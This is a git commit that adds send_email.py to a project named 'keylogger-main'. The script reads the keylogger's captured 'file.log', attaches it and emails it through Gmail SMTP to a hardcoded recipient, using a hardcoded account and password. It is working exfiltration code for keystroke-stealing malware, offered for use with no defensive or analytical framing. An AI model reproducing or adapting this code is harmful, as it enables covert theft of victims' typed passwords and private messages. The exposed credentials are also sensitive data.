7ed237dd3106c63814cc319c09afd3ff721784ef
l-u-c-i-i <115399680+l-u-c-i-i@users.noreply.github.com>
2022-12-19 19:00:56 +0100

    Add files via upload

---
+++ keylogger-main/send_email.py
@@ -0,0 +1,48 @@
+
+
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+
+#put your gmail id, password, sender address over here
+
+email_user = 'keylogger1628272@gmail.com'
+email_password = 'keddd126/'
+email_send = 'luciizozzap@gmail.com'
+#put any subject you like
+subject = 'whatever_you_want_the_subject_to_be'
+
+#fill in the body of the email
+
+msg = MIMEMultipart()
+msg['From'] = email_user
+msg['To'] = email_send
+msg['Subject'] = subject
+#put any body you like
+body = 'whatever_you_want_the_body_of_the_email_to_be'
+msg.attach(MIMEText(body,'plain'))
+
+#do not change the file name for the keylogger to work
+
+#do not change anything from here to bottom
+
+filename='file.log'
+attachment  =open(filename,'rb')
+
+part = MIMEBase('application','octet-stream')
+part.set_payload((attachment).read())
+encoders.encode_base64(part)
+part.add_header('Content-Disposition',"attachment; filename= "+filename)
+
+msg.attach(part)
+text = msg.as_string()
+server = smtplib.SMTP('smtp.gmail.com',587)
+server.starttls()
+server.login(email_user,email_password)
+
+
+server.sendmail(email_user,email_send,text)
+server.quit()
+
